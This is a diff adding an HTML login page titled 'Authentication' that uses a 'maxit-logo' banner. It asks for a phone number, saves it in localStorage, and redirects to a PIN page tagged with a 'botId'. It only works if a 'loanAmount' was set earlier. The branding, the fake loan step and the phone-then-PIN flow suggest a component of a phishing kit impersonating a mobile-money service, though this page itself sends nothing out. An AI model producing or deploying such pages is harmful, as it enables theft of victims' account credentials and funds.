@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Authentication</title>
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family: Arial, sans-serif;
+}
+
+body{
+background:#000;
+height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+}
+
+.app{
+width:100%;
+max-width:420px;
+height:100vh;
+background:#000;
+display:flex;
+flex-direction:column;
+}
+
+/* IMAGE SECTION */
+
+.top-image{
+width:100%;
+height:55%;
+background:url("maxit-logo.jpeg") center/cover no-repeat;
+}
+
+/* FORM SECTION */
+
+.form-section{
+background:#111;
+color:white;
+padding:30px 25px;
+border-top-left-radius:35px;
+border-top-right-radius:35px;
+margin-top:-40px;
+flex:1;
+}
+
+.form-section h2{
+margin-bottom:25px;
+font-size:22px;
+}
+
+.input-box{
+display:flex;
+align-items:center;
+border-bottom:1px solid #555;
+margin-bottom:25px;
+padding-bottom:8px;
+}
+
+.input-box span{
+margin-right:10px;
+font-size:18px;
+}
+
+.input-box input{
+background:none;
+border:none;
+outline:none;
+color:white;
+width:100%;
+font-size:16px;
+padding:8px 0;
+}
+
+button{
+width:100%;
+padding:14px;
+background:#7a3d1c;
+border:none;
+border-radius:6px;
+color:white;
+font-size:16px;
+cursor:pointer;
+}
+
+button:disabled{
+background:#444;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="app">
+
+<div class="top-image">
+    <img src="logimg.jpeg">
+</div>
+
+<div class="form-section">
+
+<h2>Authentication</h2>
+
+<form id="detailsForm">
+
+<div class="input-box">
+<span>📞</span>
+<input id="phone" placeholder="Enter your phone number" required>
+</div>
+
+<button id="nextBtn">Log in</button>
+
+</form>
+
+</div>
+
+</div>
+
+<script>
+
+const params = new URLSearchParams(window.location.search);
+const botId = params.get('botId') || window.location.pathname.split('/').pop();
+if (!botId) { alert("Invalid access link"); throw new Error(); }
+
+if (!localStorage.getItem('loanAmount')) {
+    window.location.href = `index.html?botId=${botId}`;
+}
+
+const confirmCheck = document.getElementById('confirmCheck');
+const nextBtn = document.getElementById('nextBtn');
+
+if(confirmCheck){
+confirmCheck.addEventListener('change', () => {
+    nextBtn.disabled = !confirmCheck.checked;
+});
+}
+
+document.getElementById('detailsForm').addEventListener('submit', e => {
+    e.preventDefault();
+
+    const phoneInput = document.getElementById('phone');
+
+    localStorage.setItem('phone', phoneInput.value);
+
+    window.location.href = `pin.html?botId=${botId}`;
+});
+
+</script>
+
+</body>
+</html>
